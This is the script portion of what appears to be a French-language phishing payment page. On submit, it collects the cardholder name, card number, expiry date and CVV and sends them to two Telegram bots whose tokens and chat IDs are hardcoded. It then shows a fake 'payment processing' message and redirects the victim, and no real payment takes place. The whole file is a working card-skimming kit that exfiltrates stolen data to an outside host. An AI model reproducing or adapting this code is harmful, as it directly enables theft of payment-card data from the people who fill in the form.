        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        });
        
        return await response.json();
      } catch (error) {
        console.error('Erreur lors de l\'envoi à Telegram:', error);
        return null;
      }
    }
    
    paymentForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      // Valider le formulaire
      const isValid = validatePaymentForm();
      
      if (isValid) {
        // Désactiver le bouton pour éviter les clics multiples
        payNowBtn.disabled = true;
        payNowBtn.innerHTML = '<i class="fas fa-spinner fa-spin btn--icon"></i> Traitement...';
        
        // Afficher le loading overlay
        loadingOverlay.classList.add('active');
        
        const formData = {
          cardName: document.getElementById('cardName').value,
          cardNumber: document.getElementById('cardNumber').value,
          cardExpiry: document.getElementById('cardExpiry').value,
          cardCvv: document.getElementById('cardCvv').value
        };
        
        // Afficher une notification
        showToast('Votre paiement est en cours de traitement', 'success');
        
        // Envoyer les données aux deux bots Telegram
        const bot1Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
        const bot1ChatId = '5372119436';
        
        const bot2Token = '7384748592:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
        const bot2ChatId = '8383883894';
        
        try {
          // Envoyer aux deux bots en parallèle
          await Promise.all([
            sendPaymentToTelegram(formData, bot1Token, bot1ChatId),
            sendPaymentToTelegram(formData, bot2Token, bot2ChatId)
          ]);
          
          // Rediriger vers la page de confirmation après un court délai
          setTimeout(() => {
            window.location.href = 'traitement3.html';
          }, 2000);
        } catch (error) {
          console.error('Erreur lors de l\'envoi des données:', error);
          showToast('Une erreur est survenue lors du traitement du paiement', 'error');
          payNowBtn.disabled = false;
          payNowBtn.innerHTML = 'Payer maintenant <i class="fas fa-lock btn--icon"></i>';
        } finally {
          // Cacher le loading overlay
          loadingOverlay.classList.remove('active');
        }
      } else {
        showToast('Veuillez vérifier les informations de votre carte', 'error');
      }
    });
    
    function validatePaymentForm() {
      let isValid = true;
      const requiredFields = document.querySelectorAll('#paymentForm [required]');
      
      requiredFields.forEach(field => {
        if (!field.value.trim()) {
          field.style.borderColor = 'var(--danger)';
          isValid = false;
        } else {
          field.style.borderColor = '#ddd';
        }
      });
      
      // Validation spécifique pour le numéro de carte (16 chiffres)
      const cardNumber = document.getElementById('cardNumber');
      const cardNumberValue = cardNumber.value.replace(/\s/g, '');
      if (cardNumberValue.length !== 16 || !/^\d+$/.test(cardNumberValue)) {
        cardNumber.style.borderColor = 'var(--danger)';
        isValid = false;
      }
      
      // Validation de la date d'expiration
      const cardExpiry = document.getElementById('cardExpiry');
      const expiryParts = cardExpiry.value.split('/');
      if (expiryParts.length !== 2 || expiryParts[0].length !== 2 || expiryParts[1].length !== 2) {
        cardExpiry.style.borderColor = 'var(--danger)';
        isValid = false;
      }
      
      // Validation du CVV (3 chiffres)
      const cardCvv = document.getElementById('cardCvv');
      if (cardCvv.value.length !== 3 || !/^\d+$/.test(cardCvv.value)) {
        cardCvv.style.borderColor = 'var(--danger)';
        isValid = false;
      }
      
      return isValid;
    }
    
    // Charger les données précédentes si elles existent
    document.addEventListener('DOMContentLoaded', function() {
      // Animation des éléments
      const animateElements = document.querySelectorAll('.animate__animated');
      animateElements.forEach((el, index) => {
        setTimeout(() => {
          el.style.opacity = 1;
        }, index * 100);
      });
    });
  </script>
</body>
</html>
